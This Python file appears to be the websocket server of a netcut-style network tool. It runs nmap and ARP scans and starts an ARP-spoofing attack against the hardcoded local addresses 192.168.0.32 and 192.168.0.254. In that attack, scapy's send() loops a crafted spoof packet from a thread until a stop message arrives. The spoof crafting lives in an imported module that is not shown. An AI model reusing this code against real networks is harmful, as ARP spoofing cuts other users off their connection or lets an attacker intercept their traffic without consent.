import asyncio, websockets, json, time
import netcututils as nc
import threading
from scapy.all import *
#Return an array with every IP of connected devices (on local network)

def doit(arg):
    t = threading.currentThread()
    while getattr(t, "do_run", True):
        send(arg)
    print("Stopping as you wish.")
    # todo remtre la co svp

async def echo(websocket, path):
    
    async for message in websocket:
        
        request = json.loads(message)
        if request[0] == "nmap_scan":
            await websocket.send(json.dumps(nc.nmap_scan()))
        elif request[0] == "arp_scan":
            await websocket.send(json.dumps(nc.arp_scan()))
        elif request[0] == "arp_spoof":
            # thread.setArp()
            # thread.start()
            t = threading.Thread(target=doit, args=(nc.craft_arp_spoof("192.168.0.32", "192.168.0.254"),))
            t.start()
        elif request[0] == "stop":
            # thread.stop()
            # thread.join()
            # print("re")
            t.do_run = False
            t.join()
        else:
            await websocket.send("this request doesn't exist")

        
        # print(f'1 , {request[0]} \n')
        # print(f'2 , {request[1]}')
       
        # await websocket.send(json.dumps(nmap_scan()))
        print("scan end")

asyncio.get_event_loop().run_until_complete(
    websockets.serve(echo, 'localhost', 8765))
asyncio.get_event_loop().run_forever()





